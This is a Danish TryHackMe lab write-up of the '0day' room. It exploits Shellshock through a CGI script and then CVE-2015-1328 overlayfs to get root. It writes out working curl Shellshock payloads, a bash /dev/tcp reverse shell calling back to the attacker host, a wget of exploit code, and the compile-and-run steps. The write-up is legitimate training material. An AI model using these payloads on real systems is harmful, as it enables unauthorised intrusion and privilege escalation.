TryHackMe · writeup

0day

En klassisk Shellshock-opgave med to lag: først en web-tjeneste der eksekverer kommandoer gennem CGI, derefter en gammel kernel der giver root. Undervejs var det ikke sårbarhederne, men de praktiske detaljer omkring dem, der tog tid.

Løst Exploitation / Privilege Escalation TryHackMe 2026
Shellshock CVE-2014-6271 CVE-2015-1328 ffuf Bash GCC Overlayfs
Flags er fjernet fra denne offentlige version. IP-adresserne er fra et midlertidigt TryHackMe-lab og er uden værdi uden for sessionen, så de står som de var.

Opgaven

Root my secure Website, take a step into the history of hacking.

Attacker-maskine: 10.112.75.160. Target: 10.112.165.73.

1. Enumerering

Jeg startede med at lede efter skjulte CGI-scripts i /cgi-bin/ med ffuf:

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -u http://10.112.165.73/cgi-bin/FUZZ -fc 404 -e .cgi

Et bevidst valg her var kun at filtrere 404 fra og ikke 403. En 403 på et cgi-bin-script kan betyde, at scriptet faktisk findes, men ikke kan eksekveres eller kræver en anden metode. Filtrerer man begge koder væk, risikerer man at skjule netop det fund, man leder efter.

Scanningen pegede på et test.cgi, som blev udgangspunktet for resten af opgaven.

2. Bekræftelse af Shellshock

Sårbarheden er CVE-2014-6271. Bash fejlfortolker miljøvariabler, der starter med en funktionsdefinition som () { :; };, og alt efter semikolonet bliver eksekveret som shell-kommandoer. CGI-scripts sætter typisk request-headers som User-Agent som miljøvariabler, før bash kaldes, hvilket gør dem til et oplagt injektionspunkt.

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://10.112.165.73/cgi-bin/test.cgi

Kommandoen gav output fra /etc/passwd, og sårbarheden var dermed bekræftet.

3. Reverse shell-payload

Jeg byggede payloaden med bash's /dev/tcp og skrev IP-adressen med krøllede parenteser om:

curl -H "user-agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/{10.112.165.73}/8080 0>&1'" \
  http://10.112.165.73/cgi-bin/test.cgi
bash: {10.112.165.73}: Name or service not known
bash: /dev/tcp/{10.112.165.73}/8080: Invalid argument

Bash tolkede parenteserne som en del af adressen, så opslaget fejlede. Jeg skrev payloaden om uden parenteser og med min egen maskine som callback.

4. Metasploit-forsøg (fravalgt spor)

Sideløbende prøvede jeg et Metasploit-modul (linux/http/advantech_switch_bash_env_exec) som et alternativt spor til Shellshock-udnyttelsen:

msf exploit(linux/http/advantech_switch_bash_env_exec) > set RHOST 10.112.165.73
msf exploit(linux/http/advantech_switch_bash_env_exec) > set LHOST 10.112.75.160
[!] Unknown datastore option: LHOST. Did you mean VHOST?

Modulets default payload brugte ikke LHOST (en bind shell eller en non-staged payload uden callback), så indstillingen fandtes ikke. Det er et godt eksempel på, at show options og show payloads skal læses, før man begynder at sætte variabler. Jeg droppede sporet og gik videre med den manuelle curl-baserede udnyttelse, da den passede bedre til target.

5. Reverse shell på target

Jeg satte en listener op på min egen maskine:

nc -lvp 8080

Og sendte payloaden samlet, uden krøller, med min egen IP som mål for callback'et:

curl -H "user-agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.112.75.160/8080 0>&1'" \
  http://10.112.165.73/cgi-bin/test.cgi

Denne gang landede forbindelsen:

Connection received on ip-10-112-165-73.eu-central-1.compute.internal 39691
bash: cannot set terminal process group (868): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ whoami
www-data

Den rå netcat-shell havde ingen job control og ingen TERM-variabel, så jeg opgraderede den til en fuld TTY:

python3 -c 'import pty; pty.spawn("/bin/bash")'

6. User flag

Flaget lå i /home/ryan/user.txt og er ikke gengivet her.

7. Kernel- og versionsidentifikation

uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 GNU/Linux

Kernel 3.13 er sårbar over for CVE-2015-1328, en privilege escalation-bug i Linux' overlayfs, hvor manglende tjek af brugerrettigheder ved fil-kopiering mellem lag giver en lokal bruger mulighed for at opnå root.

8. Overførsel af exploit

Jeg hentede exploit-koden med searchsploit -m 37292 og serverede den fra min egen maskine. Første forsøg gav 404, fordi jeg startede serveren i en mappe, hvor filen ikke lå:

python3 -m http.server 80
cd /tmp
wget http://10.112.75.160/37292.c
HTTP request sent, awaiting response... 404 File not found

Det gentog sig et par gange, før det gik op for mig, at http.server kun serverer filer fra den mappe, den blev startet i. Jeg flyttede filen til den mappe, serveren stod i, og hentede den igen:

wget http://10.112.75.160/37292.c
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/plain]
Saving to: '37292.c'

9. Manglende compiler-toolchain på target

Første kompileringsforsøg fejlede, fordi gcc ikke kunne finde sin egen interne compiler:

gcc 37292.c
gcc: error trying to exec 'cc1': execvp: No such file or directory

$PATH på target indeholdt ikke gcc's interne mappe med cc1:

echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.

Jeg lokaliserede den med find og pegede gcc derhen med -B:

find / -name "cc1" 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1
gcc -B/usr/lib/gcc/x86_64-linux-gnu/4.8/ 37292.c -o exploit

Det løste cc1, men afslørede et nyt problem: linkeren kunne heller ikke findes.

collect2: fatal error: cannot find 'ld'

Jeg fandt flere varianter af ld, og /usr/bin/ld lå allerede i $PATH som en symlink til ld.bfd, der så intakt ud:

ls -la /usr/bin/ld
file /usr/bin/ld
lrwxrwxrwx 1 root root 6 Apr 25  2017 /usr/bin/ld -> ld.bfd
/usr/bin/ld: symbolic link to `ld.bfd'

-B alene løste det ikke konsekvent. I stedet for at pege enkeltstier ud satte jeg en samlet $PATH, der dækkede både de normale system-binaries og gcc's egen mappe, så både cc1 og ld kunne findes af gcc og collect2 uden ekstra flag:

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8
gcc 37292.c -o exploit
chmod +x exploit

10. Privilege escalation

Exploiten udnytter overlayfs til at skrive en /etc/ld.so.preload-fil og derved injicere et shared library, der eksekveres med root-rettigheder:

./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root

11. Root flag

Flaget lå i /root/root.txt og er ikke gengivet her.

Hvad jeg lærte

Den tekniske sårbarhed var ikke det svære. Shellshock og overlayfs-exploiten er begge veldokumenterede og offentligt tilgængelige. Det, der tog tid, var detaljerne omkring dem: en payload der skulle skrives om, en HTTP-server der stod i den forkerte mappe, og en compiler på target der manglede halvdelen af sin egen toolchain i $PATH.

Den vigtigste lærdom er derfor ikke selve exploit-kommandoerne, men at læse fejlbeskeder bogstaveligt og løse dem ét ad gangen. "no such file or directory" betyder præcis det, og find er den hurtigste vej til at afgøre, om noget mangler helt, eller bare ikke er i $PATH.
